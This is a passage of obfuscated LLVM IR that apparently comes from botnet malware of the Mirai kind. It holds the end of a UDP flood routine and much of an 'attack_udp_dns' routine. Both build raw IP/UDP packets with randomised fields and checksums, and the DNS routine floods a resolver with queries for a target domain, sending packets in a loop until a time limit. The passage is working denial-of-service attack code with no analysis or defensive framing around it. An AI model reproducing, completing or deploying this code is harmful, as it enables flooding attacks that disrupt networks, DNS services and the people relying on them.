  store i32 0, i32* %11, align 4
  br label %198

; <label>:198:                                    ; preds = %325, %197
  %199 = load i32, i32* %11, align 4
  %200 = load i8, i8* %7, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp slt i32 %199, %201
  br i1 %202, label %203, label %332

; <label>:203:                                    ; preds = %198
  %204 = load i8**, i8*** %13, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8*, i8** %204, i64 %206
  %208 = load i8*, i8** %207, align 8
  store i8* %208, i8** %26, align 8
  %209 = load i8*, i8** %26, align 8
  %210 = bitcast i8* %209 to %struct.iphdr*
  store %struct.iphdr* %210, %struct.iphdr** %27, align 8
  %211 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i64 1
  %213 = bitcast %struct.iphdr* %212 to %struct.udphdr*
  store %struct.udphdr* %213, %struct.udphdr** %28, align 8
  %214 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 2
  %219 = load i8, i8* %218, align 4
  %220 = zext i8 %219 to i32
  %221 = icmp slt i32 %220, 32
  br i1 %221, label %222, label %246

; <label>:222:                                    ; preds = %203
  %223 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %224 = load i32, i32* %11, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 1
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @ntohl(i32 %228) #7
  %230 = call i32 @rand_next()
  %231 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %232 = load i32, i32* %11, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 2
  %236 = load i8, i8* %235, align 4
  %237 = zext i8 %236 to i32
  %238 = lshr i32 %230, %237
  %239 = add i32 %229, -1402957050
  %240 = add i32 %239, %238
  %241 = sub i32 %240, -1402957050
  %242 = add i32 %229, %238
  %243 = call i32 @htonl(i32 %241) #7
  %244 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 9
  store i32 %243, i32* %245, align 4
  br label %246

; <label>:246:                                    ; preds = %222, %203
  %247 = load i16, i16* %15, align 2
  %248 = zext i16 %247 to i32
  %249 = icmp eq i32 %248, 65535
  br i1 %249, label %250, label %255

; <label>:250:                                    ; preds = %246
  %251 = call i32 @rand_next()
  %252 = trunc i32 %251 to i16
  %253 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 3
  store i16 %252, i16* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %250, %246
  %256 = load i16, i16* %18, align 2
  %257 = zext i16 %256 to i32
  %258 = icmp eq i32 %257, 65535
  br i1 %258, label %259, label %264

; <label>:259:                                    ; preds = %255
  %260 = call i32 @rand_next()
  %261 = trunc i32 %260 to i16
  %262 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %263 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %262, i32 0, i32 0
  store i16 %261, i16* %263, align 2
  br label %264

; <label>:264:                                    ; preds = %259, %255
  %265 = load i16, i16* %19, align 2
  %266 = zext i16 %265 to i32
  %267 = icmp eq i32 %266, 65535
  br i1 %267, label %268, label %273

; <label>:268:                                    ; preds = %264
  %269 = call i32 @rand_next()
  %270 = trunc i32 %269 to i16
  %271 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %272 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %271, i32 0, i32 1
  store i16 %270, i16* %272, align 2
  br label %273

; <label>:273:                                    ; preds = %268, %264
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i32, i32* %21, align 4
  %290 = sext i32 %289 to i64
  %291 = sub i64 0, %290
  %292 = sub i64 12, %291
  %293 = add i64 12, %290
  %294 = trunc i64 %292 to i32
  %295 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %294)
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 2
  %298 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 1
  %300 = load i16, i16* %299, align 2
  %301 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 0
  %306 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %305, i32 0, i32 1
  store i16 %300, i16* %306, align 2
  %307 = load i32, i32* %12, align 4
  %308 = load i8*, i8** %26, align 8
  %309 = load i32, i32* %21, align 4
  %310 = sext i32 %309 to i64
  %311 = add i64 32, -2628796677424648220
  %312 = add i64 %311, %310
  %313 = sub i64 %312, -2628796677424648220
  %314 = add i64 32, %310
  %315 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %316 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %317 = load i32, i32* %11, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i64 %318
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i32 0, i32 0
  %321 = bitcast %struct.sockaddr_in* %320 to %struct.sockaddr*
  store %struct.sockaddr* %321, %struct.sockaddr** %315, align 8
  %322 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %323 = load %struct.sockaddr*, %struct.sockaddr** %322, align 8
  %324 = call i64 @sendto(i32 %307, i8* %308, i64 %313, i32 16384, %struct.sockaddr* %323, i32 16)
  br label %325

; <label>:325:                                    ; preds = %273
  %326 = load i32, i32* %11, align 4
  %327 = sub i32 0, %326
  %328 = sub i32 0, 1
  %329 = add i32 %327, %328
  %330 = sub i32 0, %329
  %331 = add nsw i32 %326, 1
  store i32 %330, i32* %11, align 4
  br label %198

; <label>:332:                                    ; preds = %198
  %333 = call i64 @time(i64* null) #6
  %334 = load i32, i32* %22, align 4
  %335 = sext i32 %334 to i64
  %336 = icmp sgt i64 %333, %335
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %332
  br label %339

; <label>:338:                                    ; preds = %332
  br label %197

; <label>:339:                                    ; preds = %337, %75, %69
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = sub i64 %81, %84
  %86 = add nsw i64 %81, %83
  %87 = trunc i64 %85 to i32
  store i32 %87, i32* %25, align 4
  %88 = load i8*, i8** %22, align 8
  %89 = icmp eq i8* %88, null
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %5
  br label %537

; <label>:91:                                     ; preds = %5
  %92 = load i8*, i8** %22, align 8
  %93 = call i32 @util_strlen(i8* %92)
  store i32 %93, i32* %23, align 4
  %94 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %94, i32* %12, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %91
  br label %537

; <label>:97:                                     ; preds = %91
  store i32 1, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = bitcast i32* %11 to i8*
  %100 = call i32 @setsockopt(i32 %98, i32 0, i32 3, i8* %99, i32 4) #6
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %97
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @close(i32 %103)
  br label %537

; <label>:105:                                    ; preds = %97
  store i32 0, i32* %11, align 4
  br label %106

; <label>:106:                                    ; preds = %332, %105
  %107 = load i32, i32* %11, align 4
  %108 = load i8, i8* %7, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %338

; <label>:111:                                    ; preds = %106
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %112 = call noalias i8* @calloc(i64 600, i64 1) #6
  %113 = load i8**, i8*** %13, align 8
  %114 = load i32, i32* %11, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i8**, i8*** %13, align 8
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8*, i8** %117, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %29, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i64 1
  %125 = bitcast %struct.iphdr* %124 to %struct.udphdr*
  store %struct.udphdr* %125, %struct.udphdr** %30, align 8
  %126 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i64 1
  %128 = bitcast %struct.udphdr* %127 to %struct.dnshdr*
  store %struct.dnshdr* %128, %struct.dnshdr** %31, align 8
  %129 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %130 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %129, i64 1
  %131 = bitcast %struct.dnshdr* %130 to i8*
  store i8* %131, i8** %32, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 %134, -1
  %136 = xor i8 15, -1
  %137 = xor i8 16, -1
  %138 = or i8 %135, %136
  %139 = or i8 16, %137
  %140 = xor i8 %138, -1
  %141 = and i8 %140, %139
  %142 = and i8 %134, 15
  %143 = xor i8 %141, -1
  %144 = xor i8 64, -1
  %145 = xor i8 100, -1
  %146 = and i8 %143, 100
  %147 = and i8 %141, %145
  %148 = and i8 %144, 100
  %149 = and i8 64, %145
  %150 = or i8 %146, %147
  %151 = or i8 %148, %149
  %152 = xor i8 %150, %151
  %153 = or i8 %143, %144
  %154 = xor i8 %153, -1
  %155 = or i8 100, %145
  %156 = and i8 %154, %155
  %157 = or i8 %152, %156
  %158 = or i8 %141, 64
  store i8 %157, i8* %133, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = xor i8 %161, -1
  %163 = xor i8 -16, -1
  %164 = xor i8 10, -1
  %165 = or i8 %162, %163
  %166 = or i8 10, %164
  %167 = xor i8 %165, -1
  %168 = and i8 %167, %166
  %169 = and i8 %161, -16
  %170 = and i8 %168, 5
  %171 = xor i8 %168, 5
  %172 = or i8 %170, %171
  %173 = or i8 %168, 5
  store i8 %172, i8* %160, align 4
  %174 = load i8, i8* %14, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 1
  store i8 %174, i8* %176, align 1
  %177 = load i8, i8* %21, align 1
  %178 = zext i8 %177 to i64
  %179 = sub i64 0, 41
  %180 = sub i64 0, %178
  %181 = add i64 %179, %180
  %182 = sub i64 0, %181
  %183 = add i64 41, %178
  %184 = sub i64 0, 2
  %185 = sub i64 %182, %184
  %186 = add i64 %182, 2
  %187 = load i32, i32* %23, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 %185, -6446584764072049967
  %190 = add i64 %189, %188
  %191 = add i64 %190, -6446584764072049967
  %192 = add i64 %185, %188
  %193 = sub i64 0, 4
  %194 = sub i64 %191, %193
  %195 = add i64 %191, 4
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %15, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load i8, i8* %16, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 %204, i8* %206, align 4
  %207 = load i8, i8* %17, align 1
  %208 = icmp ne i8 %207, 0
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %111
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %209, %111
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 17, i8* %215, align 1
  %216 = load i32, i32* @LOCAL_ADDR, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load i32, i32* %24, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load i16, i16* %18, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 2
  %226 = load i16, i16* %19, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i8, i8* %21, align 1
  %231 = zext i8 %230 to i64
  %232 = sub i64 0, %231
  %233 = sub i64 21, %232
  %234 = add i64 21, %231
  %235 = add i64 %233, -5657083081717049624
  %236 = add i64 %235, 2
  %237 = sub i64 %236, -5657083081717049624
  %238 = add i64 %233, 2
  %239 = load i32, i32* %23, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 %237, -7808867122515123718
  %242 = add i64 %241, %240
  %243 = sub i64 %242, -7808867122515123718
  %244 = add i64 %237, %240
  %245 = sub i64 %243, 3306839596432096101
  %246 = add i64 %245, 4
  %247 = add i64 %246, 3306839596432096101
  %248 = add i64 %243, 4
  %249 = trunc i64 %247 to i16
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 2
  store i16 %250, i16* %252, align 2
  %253 = load i16, i16* %20, align 2
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %256 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %255, i32 0, i32 0
  store i16 %254, i16* %256, align 2
  %257 = call zeroext i16 @htons(i16 zeroext 256) #7
  %258 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %259 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %258, i32 0, i32 1
  store i16 %257, i16* %259, align 2
  %260 = call zeroext i16 @htons(i16 zeroext 1) #7
  %261 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %262 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %261, i32 0, i32 2
  store i16 %260, i16* %262, align 2
  %263 = load i8, i8* %21, align 1
  %264 = load i8*, i8** %32, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %32, align 8
  store i8 %263, i8* %264, align 1
  %266 = load i8, i8* %21, align 1
  %267 = zext i8 %266 to i32
  %268 = load i8*, i8** %32, align 8
  %269 = sext i32 %267 to i64
  %270 = getelementptr inbounds i8, i8* %268, i64 %269
  store i8* %270, i8** %32, align 8
  %271 = load i8*, i8** %32, align 8
  store i8* %271, i8** %33, align 8
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i64 1
  %274 = load i8*, i8** %22, align 8
  %275 = load i32, i32* %23, align 4
  %276 = sub i32 %275, 582602414
  %277 = add i32 %276, 1
  %278 = add i32 %277, 582602414
  %279 = add nsw i32 %275, 1
  call void @util_memcpy(i8* %273, i8* %274, i32 %278)
  store i32 0, i32* %26, align 4
  br label %280

; <label>:280:                                    ; preds = %312, %213
  %281 = load i32, i32* %26, align 4
  %282 = load i32, i32* %23, align 4
  %283 = icmp slt i32 %281, %282
  br i1 %283, label %284, label %317

; <label>:284:                                    ; preds = %280
  %285 = load i8*, i8** %22, align 8
  %286 = load i32, i32* %26, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8, i8* %285, i64 %287
  %289 = load i8, i8* %288, align 1
  %290 = sext i8 %289 to i32
  %291 = icmp eq i32 %290, 46
  br i1 %291, label %292, label %305

; <label>:292:                                    ; preds = %284
  %293 = load i8, i8* %27, align 1
  %294 = load i8*, i8** %33, align 8
  store i8 %293, i8* %294, align 1
  store i8 0, i8* %27, align 1
  %295 = load i8, i8* %28, align 1
  %296 = add i8 %295, 58
  %297 = add i8 %296, 1
  %298 = sub i8 %297, 58
  %299 = add i8 %295, 1
  store i8 %298, i8* %28, align 1
  %300 = load i8*, i8** %32, align 8
  %301 = load i32, i32* %26, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds i8, i8* %300, i64 %302
  %304 = getelementptr inbounds i8, i8* %303, i64 1
  store i8* %304, i8** %33, align 8
  br label %311

; <label>:305:                                    ; preds = %284
  %306 = load i8, i8* %27, align 1
  %307 = add i8 %306, 12
  %308 = add i8 %307, 1
  %309 = sub i8 %308, 12
  %310 = add i8 %306, 1
  store i8 %309, i8* %27, align 1
  br label %311

; <label>:311:                                    ; preds = %305, %292
  br label %312

; <label>:312:                                    ; preds = %311
  %313 = load i32, i32* %26, align 4
  %314 = sub i32 0, 1
  %315 = sub i32 %313, %314
  %316 = add nsw i32 %313, 1
  store i32 %315, i32* %26, align 4
  br label %280

; <label>:317:                                    ; preds = %280
  %318 = load i8, i8* %27, align 1
  %319 = load i8*, i8** %33, align 8
  store i8 %318, i8* %319, align 1
  %320 = load i8*, i8** %32, align 8
  %321 = load i32, i32* %23, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds i8, i8* %320, i64 %322
  %324 = getelementptr inbounds i8, i8* %323, i64 2
  %325 = bitcast i8* %324 to %struct.grehdr*
  store %struct.grehdr* %325, %struct.grehdr** %34, align 8
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 0
  store i16 %326, i16* %328, align 2
  %329 = call zeroext i16 @htons(i16 zeroext 1) #7
  %330 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %331 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %330, i32 0, i32 1
  store i16 %329, i16* %331, align 2
  br label %332

; <label>:332:                                    ; preds = %317
  %333 = load i32, i32* %11, align 4
  %334 = sub i32 %333, -185971085
  %335 = add i32 %334, 1
  %336 = add i32 %335, -185971085
  %337 = add nsw i32 %333, 1
  store i32 %336, i32* %11, align 4
  br label %106

; <label>:338:                                    ; preds = %106
  br label %339

; <label>:339:                                    ; preds = %536, %338
  store i32 0, i32* %11, align 4
  br label %340

; <label>:340:                                    ; preds = %523, %339
  %341 = load i32, i32* %11, align 4
  %342 = load i8, i8* %7, align 1
  %343 = zext i8 %342 to i32
  %344 = icmp slt i32 %341, %343
  br i1 %344, label %345, label %530

; <label>:345:                                    ; preds = %340
  %346 = load i8**, i8*** %13, align 8
  %347 = load i32, i32* %11, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds i8*, i8** %346, i64 %348
  %350 = load i8*, i8** %349, align 8
  store i8* %350, i8** %35, align 8
  %351 = load i8*, i8** %35, align 8
  %352 = bitcast i8* %351 to %struct.iphdr*
  store %struct.iphdr* %352, %struct.iphdr** %36, align 8
  %353 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i64 1
  %355 = bitcast %struct.iphdr* %354 to %struct.udphdr*
  store %struct.udphdr* %355, %struct.udphdr** %37, align 8
  %356 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i64 1
  %358 = bitcast %struct.udphdr* %357 to %struct.dnshdr*
  store %struct.dnshdr* %358, %struct.dnshdr** %38, align 8
  %359 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %360 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %359, i64 1
  %361 = bitcast %struct.dnshdr* %360 to i8*
  %362 = getelementptr inbounds i8, i8* %361, i64 1
  store i8* %362, i8** %39, align 8
  %363 = load i16, i16* %15, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %379

; <label>:366:                                    ; preds = %345
  %367 = call i32 @rand_next()
  %368 = xor i32 %367, -1
  %369 = xor i32 65535, -1
  %370 = xor i32 1255569263, -1
  %371 = or i32 %368, %369
  %372 = or i32 1255569263, %370
  %373 = xor i32 %371, -1
  %374 = and i32 %373, %372
  %375 = and i32 %367, 65535
  %376 = trunc i32 %374 to i16
  %377 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 3
  store i16 %376, i16* %378, align 4
  br label %379

; <label>:379:                                    ; preds = %366, %345
  %380 = load i16, i16* %18, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  br i1 %382, label %383, label %396

; <label>:383:                                    ; preds = %379
  %384 = call i32 @rand_next()
  %385 = xor i32 %384, -1
  %386 = xor i32 65535, -1
  %387 = xor i32 -237017326, -1
  %388 = or i32 %385, %386
  %389 = or i32 -237017326, %387
  %390 = xor i32 %388, -1
  %391 = and i32 %390, %389
  %392 = and i32 %384, 65535
  %393 = trunc i32 %391 to i16
  %394 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 0
  store i16 %393, i16* %395, align 2
  br label %396

; <label>:396:                                    ; preds = %383, %379
  %397 = load i16, i16* %19, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  br i1 %399, label %400, label %413

; <label>:400:                                    ; preds = %396
  %401 = call i32 @rand_next()
  %402 = xor i32 %401, -1
  %403 = xor i32 65535, -1
  %404 = xor i32 567113807, -1
  %405 = or i32 %402, %403
  %406 = or i32 567113807, %404
  %407 = xor i32 %405, -1
  %408 = and i32 %407, %406
  %409 = and i32 %401, 65535
